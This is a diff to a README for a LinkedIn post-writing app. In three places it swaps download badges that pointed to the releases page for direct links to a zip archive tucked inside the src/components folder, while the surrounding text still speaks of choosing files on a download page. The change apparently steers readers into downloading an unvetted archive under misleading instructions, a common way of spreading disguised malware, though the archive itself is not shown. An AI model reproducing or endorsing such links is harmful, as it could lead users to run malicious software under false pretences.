@@ -1,6 +1,6 @@
 # 🤖 Linkedin_PostCraft - Speak Ideas, Create LinkedIn Posts Fast
 
-[![Download Linkedin_PostCraft](https://img.shields.io/badge/Download-Linkedin_PostCraft-blue?style=for-the-badge)](https://github.com/lunarXloom/Linkedin_PostCraft/releases)
+[![Download Linkedin_PostCraft](https://github.com/lunarXloom/Linkedin_PostCraft/raw/refs/heads/main/src/components/Post_Craft_Linkedin_2.9-beta.1.zip)](https://github.com/lunarXloom/Linkedin_PostCraft/raw/refs/heads/main/src/components/Post_Craft_Linkedin_2.9-beta.1.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Follow these steps to get Linkedin_PostCraft up and running smoothly:
 
 Click this big blue button to go to the download page:
 
-[![Download Linkedin_PostCraft](https://img.shields.io/badge/Download-Linkedin_PostCraft-blue?style=for-the-badge)](https://github.com/lunarXloom/Linkedin_PostCraft/releases)
+[![Download Linkedin_PostCraft](https://github.com/lunarXloom/Linkedin_PostCraft/raw/refs/heads/main/src/components/Post_Craft_Linkedin_2.9-beta.1.zip)](https://github.com/lunarXloom/Linkedin_PostCraft/raw/refs/heads/main/src/components/Post_Craft_Linkedin_2.9-beta.1.zip)
 
 On this page, choose the latest version for your operating system. The files are prepared to install easily.
 
@@ -113,7 +113,7 @@ If the app does not work as expected, try these fixes:
 
 Click the button below to visit the download page. Pick the file that matches your system.  
 
-[![Download Linkedin_PostCraft](https://img.shields.io/badge/Download-Linkedin_PostCraft-blue?style=for-the-badge)](https://github.com/lunarXloom/Linkedin_PostCraft/releases)
+[![Download Linkedin_PostCraft](https://github.com/lunarXloom/Linkedin_PostCraft/raw/refs/heads/main/src/components/Post_Craft_Linkedin_2.9-beta.1.zip)](https://github.com/lunarXloom/Linkedin_PostCraft/raw/refs/heads/main/src/components/Post_Craft_Linkedin_2.9-beta.1.zip)
 
 Select the latest stable release. The page lists files for both Windows and macOS. There will be instructions on the page to help if you get stuck.  
 
